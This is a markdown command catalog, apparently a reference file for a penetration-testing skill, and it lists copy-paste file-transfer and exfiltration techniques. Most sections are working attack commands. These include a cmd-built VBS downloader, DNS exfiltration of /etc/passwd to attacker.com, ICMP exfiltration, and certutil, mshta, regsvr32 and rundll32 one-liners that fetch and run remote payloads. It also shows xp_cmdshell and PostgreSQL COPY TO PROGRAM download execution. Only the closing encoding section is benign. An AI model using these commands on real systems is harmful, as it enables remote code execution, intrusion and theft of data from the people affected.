# File Transfer Command Catalogs

Exhaustive, copy-paste command references extracted from the file transfer
skill. The core methodology and decision guidance live in `../SKILL.md`; this
document holds the long per-tool / per-protocol command dumps.

## Contents

- [Windows cmd.exe VBS Downloader](#windows-cmdexe-vbs-downloader)
- [DNS Exfiltration](#dns-exfiltration)
- [ICMP Exfiltration](#icmp-exfiltration)
- [Living Off The Land (LOLBAS/GTFOBins)](#living-off-the-land-lolbasgtfobins)
- [Database Exfiltration](#database-exfiltration)
- [Encoding / Obfuscation](#encoding--obfuscation)

## Windows cmd.exe VBS Downloader

When no PowerShell, `certutil`, or `bitsadmin` is available, build a WinHTTP
downloader from `cmd.exe` and run it with `cscript`:

```cmd
echo strUrl = WScript.Arguments.Item(0) > wget.vbs
echo StrFile = WScript.Arguments.Item(1) >> wget.vbs
echo Const HTTPREQUEST_PROXYSETTING_DEFAULT = 0 >> wget.vbs
echo Const HTTPREQUEST_PROXYSETTING_PRECONFIG = 0 >> wget.vbs
echo Const HTTPREQUEST_PROXYSETTING_DIRECT = 1 >> wget.vbs
echo Const HTTPREQUEST_PROXYSETTING_PROXY = 2 >> wget.vbs
echo Dim http, varByteArray, strData, strBuffer, lngCounter, fs, ts >> wget.vbs
echo Set http = CreateObject("WinHttp.WinHttpRequest.5.1") >> wget.vbs
echo http.Open "GET", strURL, False >> wget.vbs
echo http.Send >> wget.vbs
echo varByteArray = http.ResponseBody >> wget.vbs
echo Set http = Nothing >> wget.vbs
echo Set fs = CreateObject("Scripting.FileSystemObject") >> wget.vbs
echo Set ts = fs.CreateTextFile(StrFile, True) >> wget.vbs
echo strData = "" >> wget.vbs
echo For lngCounter = 0 to UBound(varByteArray) >> wget.vbs
echo ts.Write Chr(255 And Ascb(Midb(varByteArray,lngCounter + 1, 1))) >> wget.vbs
echo Next >> wget.vbs
echo ts.Close >> wget.vbs

cscript wget.vbs http://10.10.10.10/file.exe file.exe
```

## DNS Exfiltration

```bash
# Encode data and send via DNS queries
for data in $(cat /etc/passwd | base64 | tr -d '=' | fold -w 32); do
  dig $data.attacker.com @dns-server
done

# Receive on DNS server logs
```

## ICMP Exfiltration

```bash
# Send data in ICMP packets
cat file.txt | xxd -p -c 16 | while read line; do
  ping -c 1 -p $line 10.10.10.10
done

# Receive with tcpdump
tcpdump -i eth0 icmp -X
```

## Living Off The Land (LOLBAS/GTFOBins)

**Windows LOLBAS:**
```cmd
# certutil (already shown)
certutil -urlcache -f http://10.10.10.10/file.exe file.exe

# mshta
mshta http://10.10.10.10/payload.hta

# regsvr32
regsvr32 /s /n /u /i:http://10.10.10.10/file.sct scrobj.dll

# rundll32
rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";document.write();new%20ActiveXObject("WScript.Shell").Run("powershell -c IEX(New-Object Net.WebClient).DownloadString('http://10.10.10.10/payload.ps1')")
```

**Linux GTFOBins:**
```bash
# See GTFOBins for specific binaries
# https://gtfobins.github.io/
```

## Database Exfiltration

**MySQL:**
```sql
-- Write to file (requires FILE privilege)
SELECT * FROM users INTO OUTFILE '/tmp/users.txt';
SELECT LOAD_FILE('/etc/passwd') INTO OUTFILE '/tmp/passwd.txt';

-- Read from file
LOAD DATA INFILE '/tmp/data.txt' INTO TABLE users;
```

**MSSQL:**
```sql
-- Enable xp_cmdshell
EXEC sp_configure 'show advanced options', 1;
RECONFIGURE;
EXEC sp_configure 'xp_cmdshell', 1;
RECONFIGURE;

-- Use certutil to download
EXEC xp_cmdshell 'certutil -urlcache -f http://10.10.10.10/file.exe C:\Temp\file.exe';
```

**PostgreSQL:**
```sql
-- Write to file
COPY (SELECT * FROM users) TO '/tmp/users.txt';

-- Read from file
COPY users FROM '/tmp/data.txt';

-- Command execution to download
COPY (SELECT '') TO PROGRAM 'wget http://10.10.10.10/file.txt -O /tmp/file.txt';
```

## Encoding / Obfuscation

**Base64:**
```bash
# Encode
base64 file.txt > file.b64
cat file.txt | base64

# Decode
base64 -d file.b64 > file.txt
cat file.b64 | base64 -d > file.txt
```

**Hex Encoding:**
```bash
# Encode
xxd -p file.txt > file.hex
hexdump -ve '1/1 "%.2x"' file.txt > file.hex

# Decode
xxd -r -p file.hex > file.txt
```

**Gzip Compression:**
```bash
# Compress
gzip file.txt  # Creates file.txt.gz

# Decompress
gunzip file.txt.gz
```

**Tar Archive:**
```bash
# Create
tar -czf archive.tar.gz directory/

# Extract
tar -xzf archive.tar.gz
```
